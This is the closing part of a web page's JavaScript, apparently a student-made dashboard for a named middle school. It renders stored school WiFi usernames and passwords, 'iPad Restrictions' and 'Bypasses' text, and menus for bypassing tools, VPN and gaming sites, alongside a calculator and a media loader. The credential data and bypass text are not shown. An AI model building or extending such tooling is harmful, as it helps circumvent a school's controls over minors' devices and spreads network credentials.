    const goBackButton = modal.querySelector('.go-back-button');
    const calculatorView = document.getElementById('calculatorView');
    const converterView = document.getElementById('converterView');

    if (contentDisplay) {
        contentDisplay.innerHTML = '';
        contentDisplay.style.display = 'none';
    }
    if (optionsContainer) {
        optionsContainer.style.display = 'flex';
    }
    if (goBackButton) {
        goBackButton.style.display = 'none';
    }
    if (modalId === 'calculatorModal') {
        if (calculatorView) calculatorView.style.display = 'none';
        if (converterView) converterView.style.display = 'none';
        const calcDisplay = document.getElementById('calcDisplay');
        if (calcDisplay) calcDisplay.textContent = '0';
        const fromValueInput = document.getElementById('fromValue');
        const toValueInput = document.getElementById('toValue');
        if (fromValueInput) fromValueInput.value = '';
        if (toValueInput) toValueInput.value = '';
        updateConversionUnits();
    }
    if (modalId === 'mediaPlayerModal') {
        const mediaFrame = document.getElementById('mediaFrame');
        const mediaUrlInput = document.getElementById('mediaUrl');
        if(mediaFrame) mediaFrame.src = 'about:blank';
        if(mediaUrlInput) mediaUrlInput.value = '';
    }

    logActivity(`Reset modal content for: ${modalId}`);
}

function showOptions(optionsContainerId, contentDisplayId, goBackButtonId) {
    const optionsContainer = document.getElementById(optionsContainerId);
    const contentDisplay = document.getElementById(contentDisplayId);
    const goBackButton = document.getElementById(goBackButtonId);

    if (optionsContainer) optionsContainer.style.display = 'flex';
    if (contentDisplay) {
      contentDisplay.style.display = 'none';
      contentDisplay.innerHTML = '';
    }
    if (goBackButton) goBackButton.style.display = 'none';
}

function showContent(optionsContainerId, contentDisplayId, goBackButtonId, contentHtml) {
    const optionsContainer = document.getElementById(optionsContainerId);
    const contentDisplay = document.getElementById(contentDisplayId);
    const goBackButton = document.getElementById(goBackButtonId);

    if (optionsContainer) optionsContainer.style.display = 'none';
    if (contentDisplay) {
        contentDisplay.innerHTML = contentHtml;
        contentDisplay.style.display = 'block';
        contentDisplay.classList.add('fade-in-content');
    }
    if (goBackButton) goBackButton.style.display = 'block';
}

function openWifiModal() {
    togglePanel('schoolWifiModal');
    showOptions('wifiOptionsContainer', 'wifiInfoDisplay', 'wifiGoBackButton');
}

function displaySingleWifiInfo(networkName) {
    const displayArea = document.getElementById('wifiInfoDisplay');
    if (!displayArea) return;
    const network = wifiNetworks[networkName];
    if (!network) {
        displayArea.innerHTML = `<div class="text-red-400">Network "${networkName}" details not found.</div>`;
        return;
    }

    let htmlContent = `<div class="mb-4 pb-4">
                            <h3 class="text-xl font-bold text-accent-color mb-2">${network["Network Name"]}</h3>
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-x-4 gap-y-2">
                                <p><strong>Wifi Level:</strong> <span class="${getColorClass(network["Wifi Level"])}">${network["Wifi Level"]}</span></p>
                                <p><strong>Security Type:</strong> <span class="${getColorClass(network["Wifi Security Type"])}">${network["Wifi Security Type"]}</span></p>
                                <p><strong>Encryption Type:</strong> <span class="${getColorClass(network["Wifi Encryption Type"])}">${network["Wifi Encryption Type"]}</span></p>
                                <p><strong>Hidden?:</strong> <span class="${getColorClass(network["Hidden?"])}">${network["Hidden?"]}</span></p>
                                <p><strong>Monitored?:</strong> <span class="${getColorClass(network["Monitored?"])}">${network["Monitored?"]}</span></p>
                                <p><strong>Username:</strong> ${network["Username"]}</p>
                                <p><strong>Password:</strong> ${network["Password"]}</p>
                            </div>
                        </div>`;
    showContent('wifiOptionsContainer', 'wifiInfoDisplay', 'wifiGoBackButton', htmlContent);
    logActivity(`Displayed WiFi info for: ${networkName}`);
}

function displayAllWifiInfo() {
    const displayArea = document.getElementById('wifiInfoDisplay');
    if (!displayArea) return;

    let htmlContent = '';
    for (const networkName in wifiNetworks) {
        const network = wifiNetworks[networkName];
        htmlContent += `<div class="mb-4 pb-4 border-b border-gray-700 last:border-b-0">
                            <h3 class="text-xl font-bold text-accent-color mb-2">${network["Network Name"]}</h3>
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-x-4 gap-y-2">
                                <p><strong>Wifi Level:</strong> <span class="${getColorClass(network["Wifi Level"])}">${network["Wifi Level"]}</span></p>
                                <p><strong>Security Type:</strong> <span class="${getColorClass(network["Wifi Security Type"])}">${network["Wifi Security Type"]}</span></p>
                                <p><strong>Encryption Type:</strong> <span class="${getColorClass(network["Wifi Encryption Type"])}">${network["Wifi Encryption Type"]}</span></p>
                                <p><strong>Hidden?:</strong> <span class="${getColorClass(network["Hidden?"])}">${network["Hidden?"]}</span></p>
                                <p><strong>Monitored?:</strong> <span class="${getColorClass(network["Monitored?"])}">${network["Monitored?"]}</span></p>
                                <p><strong>Username:</strong> ${network["Username"]}</p>
                                <p><strong>Password:</strong> ${network["Password"]}</p>
                            </div>
                        </div>`;
    }
    showContent('wifiOptionsContainer', 'wifiInfoDisplay', 'wifiGoBackButton', htmlContent);
    logActivity('Displayed all School Wifi Information.');
}

function goBackToWifiOptions() {
    showOptions('wifiOptionsContainer', 'wifiInfoDisplay', 'wifiGoBackButton');
}

function displayiPadRestrictions(type) {
    const displayArea = document.getElementById('ipadRestrictionsDisplay');
    if (!displayArea) return;

    let content = iPadRestrictionsContent[type] || "Content not found.";
    let colorClass = (type === 'bypasses') ? 'text-color-dangerous' : '';
    let formattedContent = `<div class="mb-4 pb-4">
                                <h3 class="text-xl font-bold text-accent-color mb-2">${type.replace('restrictions', 'Restrictions').replace('bypasses', 'Bypasses')}</h3>
                                <p class="${colorClass}">${content.replace(/\n/g, '<br>')}</p>
                            </div>`;
    showContent('ipadRestrictionsOptionsContainer', 'ipadRestrictionsDisplay', 'ipadRestrictionsGoBackButton', formattedContent);
    logActivity(`Displayed iPad ${type}.`);
}

function goBackToiPadRestrictionsOptions() {
    showOptions('ipadRestrictionsOptionsContainer', 'ipadRestrictionsDisplay', 'ipadRestrictionsGoBackButton');
}

function displaySchoolDetails() {
    const displayArea = document.getElementById('schoolInfoDisplay');
    if (!displayArea) return;

    let htmlContent = `
        <h3 class="text-xl font-bold text-accent-color mb-2">Middletown Area Middle School</h3>
        <p><strong>Address:</strong> 215 Oberlin RoadMiddletown, PA 17057</p>
        <p><strong>School Phone:</strong> 717-930-0739</p>
        <p><strong>School Fax:</strong> 717-944-0591</p>
        <div class="my-4 border-t border-gray-700 pt-4">
            <h4 class="text-lg font-semibold text-accent-secondary mb-1">Principal:</h4>
            <p><strong>Name:</strong> Dr. Shannon L. Wevodau</p>
            <p><strong>Phone:</strong> 717-930-0739</p>
            <p><strong>Email:</strong> <a href="mailto:swevodau@raiderweb.org" class="text-success-color hover:underline">swevodau@raiderweb.org</a></p>
        </div>
        <div class="border-t border-gray-700 pt-4">
            <h4 class="text-lg font-semibold text-accent-secondary mb-1">Assistant Principal:</h4>
            <p><strong>Name:</strong> Mr. Michael DeFilippo</p>
            <p><strong>Phone:</strong> 717-930-0739</p>
            <p><strong>Email:</strong> <a href="mailto:mdefilippo@raiderweb.org" class="text-success-color hover:underline">mdefilippo@raiderweb.org</a></p>
        </div>
    `;
    showContent('schoolInfoOptionsContainer', 'schoolInfoDisplay', 'schoolInfoGoBackButton', htmlContent);
    logActivity('Displayed School Information.');
}

function goBackToSchoolInfoOptions() {
    showOptions('schoolInfoOptionsContainer', 'schoolInfoDisplay', 'schoolInfoGoBackButton');
}

function displayKeyboardShortcuts() {
    const displayArea = document.getElementById('keyboardShortcutsDisplay');
    if (!displayArea) return;

    let formattedContent = `<div class="mb-4 pb-4">
                                <h3 class="text-xl font-bold text-accent-color mb-2">Keyboard Shortcuts</h3>
                                <p>${keyboardShortcutsContent.replace(/\n/g, '<br>')}</p>
                            </div>`;
    showContent('keyboardTricksOptionsContainer', 'keyboardShortcutsDisplay', 'keyboardTricksGoBackButton', formattedContent);
    logActivity('Displayed Keyboard Shortcuts.');
}

function goBackToKeyboardTricksOptions() {
    showOptions('keyboardTricksOptionsContainer', 'keyboardShortcutsDisplay', 'keyboardTricksGoBackButton');
}

function displayUpdateMessage(item, contentDisplayId, optionsContainerId, goBackButtonId) {
    const displayArea = document.getElementById(contentDisplayId);
    if (!displayArea) {
        showNotification(`Info for "${item}" is: Update coming soon! (Display area not found: ${contentDisplayId})`);
        return;
    }

    let htmlContent = `<div class="text-center py-8">
                            <p class="text-2xl font-bold text-warning-color mb-4">
                                <i class="fas fa-exclamation-triangle mr-2"></i> Update Coming Soon! <i class="fas fa-exclamation-triangle ml-2"></i>
                            </p>
                            <p class="text-lg text-text-secondary">Information for <strong>"${item}"</strong> is currently being prepared and will be available shortly.</p>
                            <p class="text-sm mt-4">Thank you for your patience!</p>
                        </div>`;
    showContent(optionsContainerId, contentDisplayId, goBackButtonId, htmlContent);
    logActivity(`Displayed 'Update coming soon' for: ${item}`);
}

function goBackToBypassingToolsOptions() {
    showOptions('bypassingToolsOptionsContainer', 'bypassingToolsDisplay', 'bypassingToolsGoBackButton');
}
function goBackToSchoolMapOptions() {
    showOptions('schoolMapOptionsContainer', 'schoolMapDisplay', 'schoolMapGoBackButton');
}
function goBackToPhoneDirectoryOptions() {
    showOptions('phoneDirectoryOptionsContainer', 'phoneDirectoryDisplay', 'phoneDirectoryGoBackButton');
}
function goBackToMusicWebsitesOptions() {
    showOptions('musicWebsitesOptionsContainer', 'musicWebsitesDisplay', 'musicWebsitesGoBackButton');
}
function goBackToGamingWebsitesOptions() {
    showOptions('gamingWebsitesOptionsContainer', 'gamingWebsitesDisplay', 'gamingWebsitesGoBackButton');
}
function goBackToVpnWebsitesOptions() {
    showOptions('vpnWebsitesOptionsContainer', 'vpnWebsitesDisplay', 'vpnWebsitesGoBackButton');
}

function showCalculator() {
    const optionsContainer = document.getElementById('calculatorOptionsContainer');
    const calculatorView = document.getElementById('calculatorView');
    const converterView = document.getElementById('converterView');
    const goBackButton = document.getElementById('calculatorGoBackButton');

    if (optionsContainer) optionsContainer.style.display = 'none';
    if (calculatorView) calculatorView.style.display = 'block';
    if (converterView) converterView.style.display = 'none';
    if (goBackButton) goBackButton.style.display = 'block';

    logActivity('Opened Calculator in modal.');
}

function showConverter() {
    const optionsContainer = document.getElementById('calculatorOptionsContainer');
    const calculatorView = document.getElementById('calculatorView');
    const converterView = document.getElementById('converterView');
    const goBackButton = document.getElementById('calculatorGoBackButton');

    if (optionsContainer) optionsContainer.style.display = 'none';
    if (calculatorView) calculatorView.style.display = 'none';
    if (converterView) {
        converterView.style.display = 'block';
        updateConversionUnits();
    }
    if (goBackButton) goBackButton.style.display = 'block';

    logActivity('Opened Unit Converter in modal.');
}

function goBackToCalculatorOptions() {
    const optionsContainer = document.getElementById('calculatorOptionsContainer');
    const calculatorView = document.getElementById('calculatorView');
    const converterView = document.getElementById('converterView');
    const goBackButton = document.getElementById('calculatorGoBackButton');

    if (optionsContainer) optionsContainer.style.display = 'flex';
    if (calculatorView) calculatorView.style.display = 'none';
    if (converterView) converterView.style.display = 'none';
    if (goBackButton) goBackButton.style.display = 'none';

    logActivity('Returned to Calculator/Converter options.');
}

function loadMedia() {
    const mediaUrlInput = document.getElementById('mediaUrl');
    const mediaFrame = document.getElementById('mediaFrame');
    if (!mediaUrlInput || !mediaFrame) return;
    let url = mediaUrlInput.value.trim();

    if (url) {
        if (!url.startsWith('http://') && !url.startsWith('https://')) {
            url = 'https://' + url;
        }
        mediaFrame.src = url;
        logActivity(`Loaded media: ${url}`);
        showNotification(`Loading media from: ${url}`);
    } else {
        mediaFrame.src = 'about:blank';
        logActivity('Media URL cleared.');
        showNotification('Please enter a media URL.');
    }
}

function loadMediaFromToolbar(url) {
    const mediaFrame = document.getElementById('mediaFrame');
    const mediaUrlInput = document.getElementById('mediaUrl');
    if (!mediaFrame || !mediaUrlInput) return;

    mediaUrlInput.value = url;
    if (url) {
        mediaFrame.src = url;
        logActivity(`Loaded media from toolbar: ${url}`);
        showNotification(`Loading media from: ${url}`);
    }
}

document.addEventListener('DOMContentLoaded', () => {
setupToggles();

if (submitBtn) {
    submitBtn.addEventListener('click', (e) => {
        e.preventDefault();
        stats.buttonPresses++;
        attemptLogin();
    });
}

if (resetBtn) {
    resetBtn.addEventListener('click', resetCounter);
}

document.addEventListener('keydown', (e) => {
if (e.key === 'Enter') {
    if (resetPopup && resetPopup.style.display === 'flex') {
        resetCounter();
    } else if (document.getElementById('loginScreen') && !document.getElementById('loginScreen').classList.contains('hidden')) {
        attemptLogin();
    }
}
});

const penColorInput = document.getElementById('penColor');
if (penColorInput) {
    penColorInput.addEventListener('change', (e) => {
        currentColor = e.target.value;
    });
}

const penThicknessInput = document.getElementById('penThickness');
if (penThicknessInput) {
    penThicknessInput.addEventListener('input', (e) => {
        currentThickness = parseInt(e.target.value);
    });
}

const textNotesInput = document.getElementById('textNotes');
if (textNotesInput) {
    const savedNotes = localStorage.getItem('textNotes');
    if (savedNotes) {
        textNotesInput.value = savedNotes;
    }
}

document.addEventListener('click', (e) => {
    if (e.target.tagName === 'BUTTON' && !e.target.closest('.panel-controls') && !e.target.classList.contains('submit-btn')) {
        stats.buttonPresses++;
        updateStats();
    } else if (e.target.closest('.quick-btn')) {
        stats.buttonPresses++;
        updateStats();
    } else if (e.target.closest('.feature-button-group')) {
        stats.buttonPresses++;
        updateStats();
    } else if (e.target.classList.contains('sub-feature-button')) {
        stats.buttonPresses++;
        updateStats();
    }
});

const importantDateDayInput = document.getElementById('importantDateDay');
const importantDateTimeInput = document.getElementById('importantDateTime');

if (importantDateDayInput) {
    const today = new Date();
    importantDateDayInput.value = today.toISOString().split('T')[0];
}
if (importantDateTimeInput) {
    importantDateTimeInput.value = "09:00";
}

});
</script>

</body>
</html>
